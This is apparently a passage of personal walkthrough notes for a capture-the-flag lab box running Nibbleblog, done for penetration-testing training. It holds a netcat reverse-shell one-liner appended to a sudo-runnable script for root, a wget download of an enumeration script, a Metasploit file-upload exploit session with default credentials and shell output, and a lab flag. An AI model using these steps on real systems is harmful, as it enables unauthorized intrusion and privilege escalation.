[LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) to perform some automated privilege escalation checks

```pug
sudo python3 -m http.server 8080
```
Back on the target type `wget http://<your ip>:8080/LinEnum.sh` to download the script
`chmod +x LinEnum.sh` to make the script executable and then type `./LinEnum.sh` to run it
![[Pasted image 20250207094509.png]]
+ chmod -x LiNum.sh
- ./LiNum.sh

TON of INFO

```shell-session
[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
```
we could have checked with `sudo -l`
![[Pasted image 20250207095302.png]]


reverse shell one liner (as a root user as the monitor.sh is with sudo previlige)
```pug
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.65 8443 >/tmp/f' | tee -a monitor.sh
```
listen
```pug
nc -lvnp 8443
```
and start
```pug
sudo ./monitor.sh
```

-> root access

de5e5d6619862a8aa5b9b212314e0cdd
![[Pasted image 20240427173540.png]]




## Metasploit vers
```shell-session
msf6 > search nibbleblog

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description

-  ----                                       ---------------  ----       -----  -----------

   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload
```

```shell-session
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(multi/http/nibbleblog_file_upload) > set rhosts 10.129.42.190
rhosts => 10.129.42.190
msf6 exploit(multi/http/nibbleblog_file_upload) > set lhost 10.10.14.2 
lhost => 10.10.14.2
```

```shell-session
msf6 exploit(multi/http/nibbleblog_file_upload) > show options 

Module options (exploit/multi/http/nibbleblog_file_upload):

  Name       Current Setting  Required  Description
----       ---------------  --------  -----------
  PASSWORD                    yes       The password to authenticate with
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS     10.129.42.190    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path to the web application
  USERNAME                    yes       The username to authenticate with
  VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

  Name   Current Setting  Required  Description
----   ---------------  --------  -----------
  LHOST  10.10.14.2       yes       The listen address (an interface may be specified)
  LPORT  4444             yes       The listen port


Exploit target:

  Id  Name
--  ----
  0   Nibbleblog 4.0.3
```

```shell-session
msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin
username => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
password => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi nibbleblog
targeturi => nibbleblog
```

```shell-session
msf6 exploit(multi/http/nibbleblog_file_upload) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf6 exploit(multi/http/nibbleblog_file_upload) > show options 

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   nibbles          yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.42.190  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  nibbleblog       yes       The base path to the web application
   USERNAME   admin            yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.2      yes       The listen address (an interface may be specified)
   LPORT  4444            yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3


msf6 exploit(multi/http/nibbleblog_file_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Command shell session 4 opened (10.10.14.2:4444 -> 10.129.42.190:53642) at 2021-04-21 16:32:37 +0000
[+] Deleted image.php

id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```
From here, we can follow the same privilege escalation path.